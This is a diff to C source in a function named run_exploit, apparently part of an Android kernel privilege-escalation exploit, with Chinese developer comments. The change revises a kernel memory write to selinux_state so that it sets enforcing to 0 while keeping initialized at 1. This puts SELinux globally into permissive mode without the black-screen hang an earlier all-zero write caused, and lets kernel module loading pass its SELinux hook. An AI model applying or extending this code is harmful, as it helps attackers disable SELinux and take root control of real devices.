@@ -860,14 +860,36 @@ int run_exploit(int argc, char **argv) {
            * 效果: avc_denied 永走 tbz allow → 全局 permissive →
            *   mt47/73 检测复活(C 写不再致盲) + finit_module SELinux 钩子放行。
            * PI 词保持全 0(复位块处理) → pi erase 走 root 无害路径, 与 R/C 轮同。
-           * 写后验证: cat /sys/fs/selinux/enforce == 0。 */
+           * 写后验证: cat /sys/fs/selinux/enforce == 0。
+           * ── mt76 (E5v2, 2026-09-05 黑屏后修订) ──
+           * E5v1(全零) 实测 2/2 黑屏挂死(心跳在 ~80s ≈ watchdog 周期处戛然而止)。
+           * 静态排查(见 CHECKPOINT_e5_geometry §八):
+           *   - 内核镜像内 159 个 selinux_state 引用者全是 SELinux 自身机制,
+           *     无 OEM 看门狗函数 → 非内核反制;
+           *   - 清零窗 +0..+7 无指针(avc@+0x48, xref 仅物化 +0/+2/+7) → 无 NULL deref;
+           *   - initialized=0 时 compute_av/may_create/exec 全走早期放行 → 非内核拒绝挂死。
+           * 结论: 杀手在用户态(framework 对 enforce=0/状态不一致的反应)。
+           * E5v2: 写值不再是全零 — PSELECT_SELINUX_ENF_VALUE (hex, 默认 0x10000):
+           *   +0 enforcing=0, +1 checkreqprot=0, +2 initialized=1(★保留★),
+           *   +3..+7 policycap[0..4]=0(特性关闭, 良性)。
+           *   → policy 保持"已加载", 决策走正常 compute_av + avc_denied permissive
+           *   分支 = allow + audit; framework 一致性最大保留。
+           * E5R(恢复轮): 同几何, VALUE=0x10001 → enforcing=1 立即还原,
+           *   把 permissive 暴露窗口压到分钟级(R 先行→E5→C+KO→E5R 背靠背)。 */
           uintptr_t enf_alias = P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + SELINUX_STATE_OFF);
+          uint64_t mt76_val = 0x10000ULL;
+          char *mt76_vs = getenv("PSELECT_SELINUX_ENF_VALUE");
+          if (mt76_vs && *mt76_vs)
+            mt76_val = strtoull(mt76_vs, NULL, 0);
           snprintf(pc_env, sizeof(pc_env), "%zx",
                    (size_t)((enf_alias - 8) & ~3ULL));
-          snprintf(right_env, sizeof(right_env), "0");
+          snprintf(right_env, sizeof(right_env), "%zx", (size_t)mt76_val);
           snprintf(left_env, sizeof(left_env), "0");
-          pr_info("mt74: SELINUX_ENF write pc=%s (STORE→[selinux_state+0]=0, "
-                  "enforcing@+0 avc_denied 实证)\n", pc_env);
+          pr_info("mt74/76: SELINUX_ENF write pc=%s value=%llx "
+                  "(enforcing=%llx initialized@+2=%llx — E5v2 保留 initialized)\n",
+                  pc_env, (unsigned long long)mt76_val,
+                  (unsigned long long)(mt76_val & 0xff),
+                  (unsigned long long)((mt76_val >> 16) & 0xff));
           fflush(stdout);
         } else if (getenv("PSELECT_PTR_PI")) {
           /* mt72 (E4): pi_tree_entry 继承色写 — 绕开 C 几何悖论。
